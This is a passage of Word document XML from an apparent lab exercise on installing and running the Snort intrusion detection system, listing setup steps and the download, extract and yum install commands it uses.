          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>.</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ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:t>own</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oad</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ct</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>est</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>vers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on of snort</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>2. I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>deve</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>op</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ages - </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>cap and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pcre.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>3. I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>nort</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>4.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-27"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">fy </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s corre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>5. Cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gura</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ru</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>og f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ory</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>6. Cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>snor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.conf and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>p.ru</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">7. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>xecu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e snort</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>8. P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o yahoo webs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ano</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:t>nal</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>9.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-20"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">essages </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>og f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>es</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18" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId61">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 xml:space="preserve">cd </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId62">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wget htt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>s:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:hyperlink r:id="rId63">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>/w</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>w</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-13"/>
          </w:rPr>
          <w:t>w</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>.snort.org</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>down</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>oads</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>/s</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>nort</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>snort</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>2.9.8.3.ta</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-24"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>.gz</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId64">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t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>xvzf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nort-2.9.8.3.t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>.gz</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="2" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId65">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 xml:space="preserve">yum </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nsta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
